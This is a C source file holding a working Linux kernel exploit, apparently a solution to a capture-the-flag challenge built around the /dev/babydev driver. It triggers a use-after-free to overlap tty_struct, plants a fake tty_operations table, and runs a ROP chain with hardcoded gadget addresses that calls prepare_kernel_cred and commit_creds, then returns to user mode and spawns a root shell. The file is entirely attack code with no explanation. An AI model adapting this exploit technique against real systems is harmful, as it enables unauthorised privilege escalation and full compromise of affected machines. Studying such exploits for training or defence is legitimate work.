#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
    __asm__("mov %0, cs": "r=" (user_cs) : "r" (user_cs));
    __asm__("mov %0, ss": "r=" (user_ss) : "r" (user_ss));
    __asm__("pushfq");
    __asm__("popq %0": "r=" (user_rflags) : "r" (user_rflags));
}


unsigned long pivot_gadget = 0xffffffff814f5359;    // 0xffffffff814f5359: mov esp, 0x01740100 ; ret  ;  (1 found)
unsigned long pop_rdi = 0xffffffff810d238d;         // 0xffffffff810d238d: pop rdi ; ret  ;  (58 found)
unsigned long mov_rdi_rax_call_rdx_pop_rbp = 0xffffffff8180c4a2; // 0xffffffff8180c4a2: mov rdi, rax ; call rdx ;  (1 found)
unsigned long pop_rdx = 0xffffffff8144d302;         // 0xffffffff8144d302: pop rdx ; ret  ;  (1 found)
unsigned long prepare_kernel_cred = 0xffffffff810a1810;    // ffffffff810a1810 T prepare_kernel_cred
unsigned long commit_creds = 0xffffffff810a1420;    // ffffffff810a1420 T commit_creds
unsigned long iretq = 0xffffffff8181a797;
unsigned long swapgs_pop_rbp = 0xffffffff81063694; // 0xffffffff81063694: swapgs  ; pop rbp ; ret  ;  (1 found)

int fd, fd2;
unsigned long fake_tty_operations[0x100/8];
unsigned long fake_file[0x100/8];
unsigned long orig_file[0x100/8];

void shell(void) {
    write(fd, orig_file, 0x100-1);
    char *args[] = {"/bin/sh", 0};
    execve("/bin/sh", args, 0);
}

int main(void) {
    int fds[0x100];
    char buf[0x100];
    unsigned long *fake_stack;
    
    save_state();

    fake_stack = mmap(0x01740000-0x8000, 0x10000, PROT_READ|PROT_WRITE, 0x32 | MAP_POPULATE, -1, 0);
    fake_stack += (0x8100/8);
    *fake_stack++ = pop_rdi;
    *fake_stack++ = 0;
    *fake_stack++ = prepare_kernel_cred;
    *fake_stack++ = pop_rdx;
    *fake_stack++ = commit_creds + 6;
    *fake_stack++ = mov_rdi_rax_call_rdx_pop_rbp;
    *fake_stack++ = swapgs_pop_rbp;
    *fake_stack++ = 0xdeadbeef;
    *fake_stack++ = iretq;
    *fake_stack++ = (unsigned long)&shell;
    *fake_stack++ = user_cs;
    *fake_stack++ = user_rflags;
    *fake_stack++ = 0x01740000;
    *fake_stack++ = user_ss;

    puts("open twice /dev/babydev");
    fd = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);
    if (fd < 0 || fd2 < 0) {
        puts("open error");
        exit(1);
    }

    puts("call kmalloc(256)");
    ioctl(fd, 0x10001, 256);

    puts("overlap tty_struct with freed chunk");
    close(fd2);
    for (int i=0; i<0x100; i++) {
        fds[i] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    }

    puts("cause UAF");
    read(fd, fake_file, 0x100-1);
    memcpy(orig_file, fake_file, 0x100);
    fake_tty_operations[8] = pivot_gadget;
    fake_file[5] = &fake_tty_operations;
    write(fd, fake_file, 0x100-1);

    puts("trigger tty->ops->ioctl");
    for (int i=0; i<0x100; i++) {
        ioctl(fds[i], 0xdeadbeef, 0xbeefbabe);
        close(fds[i]);
    }

    while(1) {}
    return 0;
}
